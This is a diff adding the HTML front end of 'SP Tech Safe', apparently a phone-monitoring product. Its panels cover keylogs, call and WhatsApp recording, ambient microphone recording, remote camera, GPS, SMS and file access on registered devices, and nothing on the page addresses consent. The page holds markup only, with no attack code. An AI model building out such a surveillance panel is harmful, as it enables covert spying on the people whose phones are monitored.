@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SP Tech Safe — Device Dashboard</title>
+  <meta name="description" content="SP Tech Safe Device Management Dashboard — Monitor and manage registered devices.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="css/dashboard.css">
+</head>
+<body>
+
+  <div class="app-layout">
+    <div class="cyber-background"></div> <!-- Animated background -->
+
+    <!-- ========== SIDEBAR ========== -->
+    <aside class="sidebar" id="sidebar">
+
+      <!-- Logo -->
+      <div class="sidebar-logo">
+        <div class="logo-mark">
+          <svg width="36" height="36" viewBox="0 0 48 48" fill="none">
+            <path d="M24 4L6 14v20l18 10 18-10V14L24 4z" fill="url(#sLogo)" opacity="0.2"/>
+            <path d="M24 4L6 14v20l18 10 18-10V14L24 4z" stroke="url(#sLogo)" stroke-width="2" fill="none"/>
+            <text x="12" y="30" font-family="Inter" font-weight="800" font-size="16" fill="url(#sLogo)">SP</text>
+            <defs>
+              <linearGradient id="sLogo" x1="0" y1="0" x2="48" y2="48">
+                <stop offset="0%" stop-color="#3de8d4"/>
+                <stop offset="100%" stop-color="#6366f1"/>
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+        <div class="logo-text">
+          <span class="logo-title">TECH<em>Safe</em></span>
+          <span class="logo-subtitle">DEVICE MANAGER</span>
+        </div>
+      </div>
+
+      <!-- Navigation -->
+      <nav class="sidebar-nav">
+
+        <a href="#" class="nav-item" id="navHome" data-section="home" onclick="handleHomeNav(event)">
+          <i class="fa-solid fa-house"></i>
+          <span>Home</span>
+        </a>
+
+        <!-- 1. Call & SMS Monitoring -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-phone"></i>
+            <span>Call & SMS</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="calllogs"><i class="fa-solid fa-phone-volume"></i> Unlimited Call Logs</a>
+            <a href="#" class="submenu-item" data-tab="callrec"><i class="fa-solid fa-microphone"></i> Call Recording</a>
+            <a href="#" class="submenu-item" data-tab="callblock"><i class="fa-solid fa-phone-slash"></i> Call Restrictions</a>
+            <a href="#" class="submenu-item" data-tab="voiprec"><i class="fa-brands fa-whatsapp"></i> VoIP Call Recordings</a>
+            <a href="#" class="submenu-item" data-tab="sms"><i class="fa-solid fa-message"></i> Unlimited SMS Records</a>
+          </div>
+        </div>
+
+        <!-- 2. Location & Geo-Fencing -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-location-dot"></i>
+            <span>Location tracking</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="location"><i class="fa-solid fa-map-location-dot"></i> Real-time GPS</a>
+            <a href="#" class="submenu-item" data-tab="geofence"><i class="fa-solid fa-draw-polygon"></i> Geo-Fencing Alerts</a>
+            <a href="#" class="submenu-item" data-tab="loc_timeline"><i class="fa-solid fa-route"></i> Location Timeline</a>
+          </div>
+        </div>
+
+        <!-- 3. App & Web Monitoring -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-shield-halved"></i>
+            <span>App & Web Monitor</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="apps"><i class="fa-solid fa-box"></i> App Usage Tracking</a>
+            <a href="#" class="submenu-item" data-tab="appblock"><i class="fa-solid fa-ban"></i> App Blocking</a>
+            <a href="#" class="submenu-item" data-tab="browsing"><i class="fa-solid fa-clock-rotate-left"></i> Browsing History</a>
+            <a href="#" class="submenu-item" data-tab="webblock"><i class="fa-solid fa-globe"></i> Website Blocking</a>
+            <a href="#" class="submenu-item" data-tab="timeline"><i class="fa-solid fa-chart-line"></i> Timeline</a>
+          </div>
+        </div>
+
+        <!-- 4. Social Media Tracking -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-hashtag"></i>
+            <span>Social Media Tracking</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="wa_track"><i class="fa-brands fa-whatsapp"></i> WhatsApp Tracking</a>
+            <a href="#" class="submenu-item" data-tab="wa_chat"><i class="fa-brands fa-whatsapp"></i> WhatsApp Chats</a>
+            <a href="#" class="submenu-item" data-tab="fb_msg"><i class="fa-brands fa-facebook-messenger"></i> Facebook</a>
+            <a href="#" class="submenu-item" data-tab="ig_msg"><i class="fa-brands fa-instagram"></i> Instagram</a>
+            <a href="#" class="submenu-item" data-tab="social_all"><i class="fa-solid fa-icons"></i> 15+ Social Apps</a>
+            <a href="#" class="submenu-item" data-tab="social_snap"><i class="fa-brands fa-snapchat"></i> Social Snap</a>
+          </div>
+        </div>
+
+        <!-- 5. Remote Control -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-satellite-dish"></i>
+            <span>Remote Control</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="camera"><i class="fa-solid fa-camera"></i> Remote Camera</a>
+            <a href="#" class="submenu-item" data-tab="screenshot"><i class="fa-solid fa-image"></i> Remote Screenshot</a>
+            <a href="#" class="submenu-item" data-tab="ambient"><i class="fa-solid fa-microphone-lines"></i> Ambient Recording</a>
+            <a href="#" class="submenu-item" data-tab="panel"><i class="fa-solid fa-sliders"></i> Control Panel</a>
+          </div>
+        </div>
+
+        <!-- 6. File & Media Access -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-hard-drive"></i>
+            <span>File & Media Access</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="files"><i class="fa-solid fa-folder-open"></i> File Explorer</a>
+            <a href="#" class="submenu-item" data-tab="file_dl"><i class="fa-solid fa-download"></i> Remote Downloads</a>
+            <a href="#" class="submenu-item" data-tab="photos"><i class="fa-regular fa-images"></i> Photos & Images</a>
+            <a href="#" class="submenu-item" data-tab="storage_mgr"><i class="fa-solid fa-database"></i> Storage Manager</a>
+          </div>
+        </div>
+
+        <!-- 7. Additional Features -->
+        <div class="nav-group">
+          <a href="#" class="nav-item">
+            <i class="fa-solid fa-gears"></i>
+            <span>Additional Features</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu">
+            <a href="#" class="submenu-item" data-tab="notifs"><i class="fa-solid fa-bell"></i> Notifications & Alerts</a>
+            <a href="#" class="submenu-item" data-tab="bulk_dl"><i class="fa-solid fa-boxes-packing"></i> Bulk Download</a>
+            <a href="#" class="submenu-item" data-tab="support"><i class="fa-solid fa-headset"></i> Priority Support</a>
+          </div>
+        </div>
+        
+        <!-- Extraneous System/Device info (Moved down) -->
+        <div class="nav-group active">
+          <a href="#" class="nav-item active">
+            <i class="fa-solid fa-mobile-screen"></i>
+            <span>Device Hardware</span>
+            <i class="fa-solid fa-chevron-down nav-arrow"></i>
+          </a>
+          <div class="nav-submenu open">
+            <a href="#" class="submenu-item active" data-tab="deviceinfo"><i class="fa-solid fa-circle-info"></i> Device Info</a>
+             <a href="#" class="submenu-item" data-tab="contacts"><i class="fa-solid fa-address-book"></i> Contacts</a>
+             <a href="#" class="submenu-item" data-tab="iplogs"><i class="fa-solid fa-globe"></i> IP Logs</a>
+            <a href="#" class="submenu-item" data-tab="keylogs"><i class="fa-solid fa-keyboard"></i> Keylogs</a>
+            <a href="#" class="submenu-item" data-tab="wifilogs"><i class="fa-solid fa-wifi"></i> Wi-Fi Logs</a>
+          </div>
+        </div>
+
+      </nav>
+
+      <!-- Sidebar Footer -->
+      <div class="sidebar-footer">
+        <div class="sidebar-user">
+          <div class="user-avatar-small">
+            <i class="fa-solid fa-shield-halved"></i>
+          </div>
+          <div class="user-info-small">
+            <span>Admin Panel</span>
+            <span class="version">v2.1.0</span>
+          </div>
+        </div>
+      </div>
+
+    </aside>
+
+    <!-- ========== MAIN CONTENT ========== -->
+    <div class="main-wrapper">
+
+      <!-- ===== TOP HEADER ===== -->
+      <header class="top-header">
+
+        <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" aria-label="Toggle Sidebar" title="Toggle Sidebar">
+          <i class="fa-solid fa-bars"></i>
+        </button>
+
+        <div class="header-search">
+          <i class="fa-solid fa-magnifying-glass"></i>
+          <input type="text" id="searchInput" placeholder="Search devices, data..." autocomplete="off">
+          <button id="micBtn" class="mic-btn" title="Voice Search">
+            <i class="fa-solid fa-microphone"></i>
+          </button>
+        </div>
+
+        <div class="header-actions">
+          <button class="header-icon-btn" id="refreshBtn" title="Refresh data" onclick="refreshData()">
+            <i class="fa-solid fa-rotate-right"></i>
+          </button>
+          <div class="notif-wrapper">
+            <button class="header-icon-btn" id="notifBtn" title="Notifications">
+              <i class="fa-solid fa-bell"></i>
+              <span class="notif-badge" id="notifBadge">3</span>
+            </button>
+            <div class="profile-dropdown notif-dropdown-menu" id="notifDropdown">
+              <div class="notif-title">Notifications</div>
+              <div class="dropdown-divider"></div>
+              <a href="#" class="notif-item">
+                <i class="fa-solid fa-triangle-exclamation icon-danger"></i>
+                <div class="notif-content">
+                  <div class="notif-msg">Unusual login detected</div>
+                  <div class="notif-time">2 mins ago</div>
+                </div>
+              </a>
+              <a href="#" class="notif-item">
+                <i class="fa-solid fa-shield-halved icon-success"></i>
+                <div class="notif-content">
+                  <div class="notif-msg">System update completed</div>
+                  <div class="notif-time">1 hour ago</div>
+                </div>
+              </a>
+              <a href="#" class="notif-item">
+                <i class="fa-solid fa-mobile-screen icon-primary"></i>
+                <div class="notif-content">
+                  <div class="notif-msg">New device registered</div>
+                  <div class="notif-time">3 hours ago</div>
+                </div>
+              </a>
+              <div class="dropdown-divider"></div>
+              <a href="#" class="notif-view-all">View All</a>
+            </div>
+          </div>
+
+          <div class="header-profile" id="headerProfile">
+            <div class="profile-avatar">
+              <i class="fa-solid fa-user-tie"></i>
+            </div>
+            <div class="profile-details">
+              <span class="profile-name" id="profileName">Admin</span>
+            </div>
+            <i class="fa-solid fa-chevron-down profile-arrow"></i>
+
+            <!-- Profile Dropdown -->
+            <div class="profile-dropdown" id="profileDropdown">
+              <a href="#"><i class="fa-solid fa-gear"></i> Settings</a>
+              <a href="#"><i class="fa-solid fa-circle-info"></i> Help</a>
+              <div class="dropdown-divider"></div>
+              <a href="#" onclick="logout()" class="logout-link">
+                <i class="fa-solid fa-right-from-bracket"></i> Logout
+              </a>
+            </div>
+          </div>
+        </div>
+
+      </header>
+
+      <!-- ===== PAGE CONTENT ===== -->
+      <main class="page-content">
+
+        <!-- Page Title Row -->
+        <div class="page-title-row">
+          <div>
+            <h1 class="page-title" id="pageTitle">Device Information</h1>
+            <p class="page-subtitle" id="pageSubtitle">User Information</p>
+          </div>
+          <div class="device-phone-info">
+            <span class="phone-number" id="headerPhone">Loading...</span>
+            <a href="#" class="change-user-link" id="changeUserBtn" onclick="openDeviceModal(event)"><i class="fa-solid fa-arrows-rotate"></i>Change User</a>
+          </div>
+        </div>
+
+        <!-- AI INSIGHTS ROW (NEW) -->
+        <div class="ai-insights-row" id="aiInsightsRow">
+          <div class="ai-insight-card">
+            <div class="ai-insight-icon"><i class="fa-solid fa-robot"></i></div>
+            <div class="ai-insight-body">
+              <span class="ai-insight-tag">AI ANALYSIS</span>
+              <p class="ai-insight-text" id="aiInsightText">Analyzing device behavior for potential anomalies...</p>
+            </div>
+            <div class="ai-insight-sparkle"><i class="fa-solid fa-sparkles"></i></div>
+          </div>
+        </div>
+
+        <!-- Info Boxes Row -->
+        <div class="info-boxes" id="infoBoxes">
+          <div class="info-box box-blue">
+            <span class="info-label">IMEI NO</span>
+            <span class="info-value" id="imeiValue">—</span>
+          </div>
+          <div class="info-box box-green">
+            <span class="info-label">NAME</span>
+            <span class="info-value" id="nameValue">—</span>
+          </div>
+          <div class="info-box box-gray">
+            <span class="info-label">PHONE</span>
+            <span class="info-value" id="phoneValue">—</span>
+          </div>
+          <div class="info-box box-yellow">
+            <span class="info-label">LAST ONLINE</span>
+            <span class="info-value" id="lastOnlineValue">—</span>
+          </div>
+          <div class="info-box box-pink">
+            <span class="info-label">IP ADDRESS</span>
+            <span class="info-value" id="ipValue">—</span>
+          </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- TAB PANELS                                                   -->
+        <!-- ============================================================ -->
+
+        <!-- HOME TAB -->
+        <div class="tab-panel" id="panel-home">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-chart-line"></i> Dashboard Metrics</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-refresh" onclick="refreshData()">
+                <i class="fa-solid fa-rotate-right"></i> Refresh
+              </button>
+            </div>
+          </div>
+          <div class="info-boxes home-metrics-boxes">
+            <div class="info-box box-blue home-metric-box">
+              <span class="info-label">TOTAL DEVICES TRACKED</span>
+              <span class="info-value" id="homeTotalDevices">0</span>
+            </div>
+            <div class="info-box box-green home-metric-box">
+              <span class="info-label">ACTIVE NOW</span>
+              <span class="info-value" id="homeActiveNow">0</span>
+            </div>
+            <div class="info-box box-pink home-metric-box">
+              <span class="info-label">TOTAL DATA POINTS</span>
+              <span class="info-value" id="homeDataPoints">0</span>
+            </div>
+          </div>
+          <div class="home-welcome-card">
+            <div class="logo-mark home-logo-mark">
+              <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+                <path d="M24 4L6 14v20l18 10 18-10V14L24 4z" fill="url(#sLogoHome)" opacity="0.2"/>
+                <path d="M24 4L6 14v20l18 10 18-10V14L24 4z" stroke="url(#sLogoHome)" stroke-width="2" fill="none"/>
+                <text x="12" y="30" font-family="Inter" font-weight="800" font-size="16" fill="url(#sLogoHome)">SP</text>
+                <defs>
+                  <linearGradient id="sLogoHome" x1="0" y1="0" x2="48" y2="48">
+                    <stop offset="0%" stop-color="#3de8d4"/>
+                    <stop offset="100%" stop-color="#6366f1"/>
+                  </linearGradient>
+                </defs>
+              </svg>
+            </div>
+            <h3 class="home-welcome-title">Welcome to SP Tech Safe</h3>
+            <p class="home-welcome-subtitle">Select "User Data" from the sidebar or click "Change User" in the header to view specific device metrics.</p>
+          </div>
+        </div>
+
+        <!-- DEVICE INFO TAB -->
+        <div class="tab-panel active" id="panel-deviceinfo">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-circle-info"></i> Device Info</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-action btn-generate-link" onclick="openGenerateLink()">
+                <i class="fa-solid fa-link"></i> Generate Link
+              </button>
+              <button class="btn-panel-action" onclick="handleDownload('deviceinfo')">
+                <i class="fa-solid fa-download"></i> Download
+              </button>
+              <button class="btn-panel-refresh" onclick="refreshData()">
+                <i class="fa-solid fa-rotate-right"></i> Refresh
+              </button>
+            </div>
+          </div>
+          <div class="device-info-grid" id="deviceInfoGrid">
+            <div class="info-detail-card">
+              <i class="fa-solid fa-mobile-screen"></i>
+              <div>
+                <span class="detail-label">Model</span>
+                <span class="detail-value" id="dModel">—</span>
+              </div>
+            </div>
+            <div class="info-detail-card">
+              <i class="fa-solid fa-mobile-alt"></i>
+              <div>
+                <span class="detail-label">OS</span>
+                <span class="detail-value" id="dOS">—</span>
+              </div>
+            </div>
+            <div class="info-detail-card">
+              <i class="fa-solid fa-battery-three-quarters"></i>
+              <div>
+                <span class="detail-label">Battery</span>
+                <span class="detail-value" id="dBattery">—</span>
+              </div>
+            </div>
+            <div class="info-detail-card">
+              <i class="fa-solid fa-envelope"></i>
+              <div>
+                <span class="detail-label">Email</span>
+                <span class="detail-value" id="dEmail">—</span>
+              </div>
+            </div>
+            <div class="info-detail-card">
+              <i class="fa-solid fa-comment"></i>
+              <div>
+                <span class="detail-label">Comments</span>
+                <span class="detail-value" id="dComments">—</span>
+              </div>
+            </div>
+            <div class="info-detail-card">
+              <i class="fa-solid fa-fingerprint"></i>
+              <div>
+                <span class="detail-label">IMEI</span>
+                <span class="detail-value" id="dIMEI">—</span>
+              </div>
+            </div>
+          </div>
+          <!-- Feature Cards Grid (shown only on device info tab) -->
+          <div class="cards-grid" id="cardsGrid">
+            <div class="feature-card" data-tab="contacts">
+              <div class="card-icon icon-teal"><i class="fa-solid fa-address-book"></i></div>
+              <h3 class="card-title">Contacts</h3>
+              <p class="card-count" id="count-contacts">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('contacts')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('contacts')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="calllogs">
+              <div class="card-icon icon-green"><i class="fa-solid fa-phone"></i></div>
+              <h3 class="card-title">Call Logs</h3>
+              <p class="card-count" id="count-calllogs">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('calllogs')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('calllogs')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="location">
+              <div class="card-icon icon-orange"><i class="fa-solid fa-location-dot"></i></div>
+              <h3 class="card-title">Location</h3>
+              <p class="card-count" id="count-location">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('location')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('location')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="sms">
+              <div class="card-icon icon-purple"><i class="fa-solid fa-message"></i></div>
+              <h3 class="card-title">SMS</h3>
+              <p class="card-count" id="count-sms">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('sms')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('sms')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="files">
+              <div class="card-icon icon-indigo"><i class="fa-solid fa-folder"></i></div>
+              <h3 class="card-title">Files</h3>
+              <p class="card-count" id="count-files">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('files')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('files')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="apps">
+              <div class="card-icon icon-cyan"><i class="fa-solid fa-box"></i></div>
+              <h3 class="card-title">Apps</h3>
+              <p class="card-count" id="count-apps">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('apps')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('apps')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="iplogs">
+              <div class="card-icon icon-rose"><i class="fa-solid fa-globe"></i></div>
+              <h3 class="card-title">IP Logs</h3>
+              <p class="card-count" id="count-iplogs">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('iplogs')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('iplogs')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="keylogs">
+              <div class="card-icon icon-amber"><i class="fa-solid fa-keyboard"></i></div>
+              <h3 class="card-title">Keylogs</h3>
+              <p class="card-count" id="count-keylogs">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('keylogs')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('keylogs')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="camera">
+              <div class="card-icon icon-lime"><i class="fa-solid fa-camera"></i></div>
+              <h3 class="card-title">Camera</h3>
+              <p class="card-count" id="count-camera">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('camera')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('camera')">Update</button>
+              </div>
+            </div>
+            <div class="feature-card" data-tab="wifilogs">
+              <div class="card-icon icon-sky"><i class="fa-solid fa-wifi"></i></div>
+              <h3 class="card-title">Wi-Fi Logs</h3>
+              <p class="card-count" id="count-wifilogs">0 records</p>
+              <div class="card-actions">
+                <button class="btn-download" onclick="handleDownload('wifilogs')">Download</button>
+                <button class="btn-update" onclick="handleUpdate('wifilogs')">Update</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CONTACTS TAB -->
+        <div class="tab-panel" id="panel-contacts">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-address-book"></i> Contacts</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-contacts" placeholder="Search contacts..." oninput="filterTable('contacts', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('contacts')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-contacts">
+              <thead><tr><th>#</th><th>Name</th><th>Phone Number</th><th>Email</th></tr></thead>
+              <tbody id="tbody-contacts"><tr><td colspan="4" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- CALL LOGS TAB -->
+        <div class="tab-panel" id="panel-calllogs">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-phone"></i> Call Logs</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-calllogs" placeholder="Search call logs..." oninput="filterTable('calllogs', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('calllogs')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-calllogs">
+              <thead><tr><th>#</th><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
+              <tbody id="tbody-calllogs"><tr><td colspan="6" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- LOCATION TAB -->
+        <div class="tab-panel" id="panel-location">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-location-dot"></i> Location</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-action" onclick="handleDownload('location')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-location">
+              <thead><tr><th>#</th><th>Latitude</th><th>Longitude</th><th>Address</th><th>Date</th><th>Map</th></tr></thead>
+              <tbody id="tbody-location"><tr><td colspan="6" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- SMS TAB -->
+        <div class="tab-panel" id="panel-sms">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-message"></i> SMS Messages</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-sms" placeholder="Search messages..." oninput="filterTable('sms', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('sms')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-sms">
+              <thead><tr><th>#</th><th>Sender</th><th>Message</th><th>Type</th><th>Date</th></tr></thead>
+              <tbody id="tbody-sms"><tr><td colspan="5" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- FILES TAB -->
+        <div class="tab-panel" id="panel-files">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-folder"></i> Files</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-files" placeholder="Search files..." oninput="filterTable('files', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('files')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-files">
+              <thead><tr><th>#</th><th>File Name</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
+              <tbody id="tbody-files"><tr><td colspan="5" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- APPS TAB -->
+        <div class="tab-panel" id="panel-apps">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-box"></i> Installed Apps</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-apps" placeholder="Search apps..." oninput="filterTable('apps', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('apps')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-apps">
+              <thead><tr><th>#</th><th>App Name</th><th>Package</th><th>Version</th><th>Installed</th></tr></thead>
+              <tbody id="tbody-apps"><tr><td colspan="5" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- IP LOGS TAB -->
+        <div class="tab-panel" id="panel-iplogs">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-globe"></i> IP Logs</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-action" onclick="handleDownload('iplogs')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-iplogs">
+              <thead><tr><th>#</th><th>IP Address</th><th>Network</th><th>Date</th></tr></thead>
+              <tbody id="tbody-iplogs"><tr><td colspan="4" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- KEYLOGS TAB -->
+        <div class="tab-panel" id="panel-keylogs">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-keyboard"></i> Keylogs</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-action" onclick="handleDownload('keylogs')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-keylogs">
+              <thead><tr><th>#</th><th>App</th><th>Typed Text</th><th>Date</th></tr></thead>
+              <tbody id="tbody-keylogs"><tr><td colspan="4" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- CAMERA TAB -->
+        <div class="tab-panel" id="panel-camera">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-camera"></i> Camera Captures</h2>
+            <div class="panel-actions">
+              <button class="btn-panel-action" onclick="handleDownload('camera')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-camera">
+              <thead><tr><th>#</th><th>Filename</th><th>Date</th><th>Preview</th></tr></thead>
+              <tbody id="tbody-camera"><tr><td colspan="4" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- WI-FI LOGS TAB -->
+        <div class="tab-panel" id="panel-wifilogs">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-wifi"></i> Saved Wi-Fi Networks</h2>
+            <div class="panel-actions">
+              <input type="text" class="table-search" id="search-wifilogs" placeholder="Search saved networks..." oninput="filterTable('wifilogs', this.value)">
+              <button class="btn-panel-action" onclick="handleDownload('wifilogs')"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+          </div>
+          <div class="table-wrapper">
+            <table class="data-table" id="table-wifilogs">
+              <thead><tr><th>#</th><th>SSID (Network Name)</th><th>BSSID (MAC Address)</th><th>Signal Strength</th><th>Date Logged</th></tr></thead>
+              <tbody id="tbody-wifilogs"><tr><td colspan="5" class="table-empty">Loading...</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- FALLBACK TAB -->
+        <div class="tab-panel" id="panel-fallback">
+          <div class="panel-header">
+            <h2 class="panel-title"><i class="fa-solid fa-hammer"></i> Feature in Development</h2>
+          </div>
+          <div class="table-container fallback-container">
+            <i class="fa-solid fa-laptop-code fallback-icon"></i>
+            <h3 class="fallback-title">Module Upcoming</h3>
+            <p class="fallback-text">This sophisticated monitoring feature is currently being integrated and will be activated in an upcoming update.</p>
+          </div>
+        </div>
+
+      </main>
+
+    </div>
+
+  </div>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast"></div>
+
+  <!-- ========== CHANGE USER MODAL ========== -->
+  <div class="modal-overlay" id="deviceModal" onclick="handleModalOverlayClick(event)">
+    <div class="modal-box">
+      <div class="modal-header">
+        <div class="modal-title-group">
+          <div class="modal-icon"><i class="fa-solid fa-mobile-screen"></i></div>
+          <div>
+            <h3 class="modal-title">Select Device</h3>
+            <p class="modal-subtitle">Switch between registered devices</p>
+          </div>
+        </div>
+        <button class="modal-close" onclick="closeDeviceModal()" title="Close">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <div class="modal-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="text" id="modalSearch" placeholder="Search by name, IMEI or phone..." oninput="filterModalDevices(this.value)" autocomplete="off">
+      </div>
+
+      <div class="modal-device-list" id="modalDeviceList">
+        <div class="modal-loading">
+          <i class="fa-solid fa-spinner fa-spin"></i> Loading devices...
+        </div>
+      </div>
+
+      <div class="modal-footer">
+        <span class="modal-count" id="modalCount"></span>
+        <button class="modal-cancel" onclick="closeDeviceModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- AI Assistant (Floating) -->
+  <div class="ai-assistant-float" id="aiBot" onclick="toggleAiAssistant()" title="Open AI Assistant" role="button" aria-label="Open AI Assistant">
+    <div class="ai-bot-brain"><i class="fa-solid fa-brain"></i></div>
+    <div class="ai-bot-pulse"></div>
+  </div>
+
+  <!-- AI Assistant Panel -->
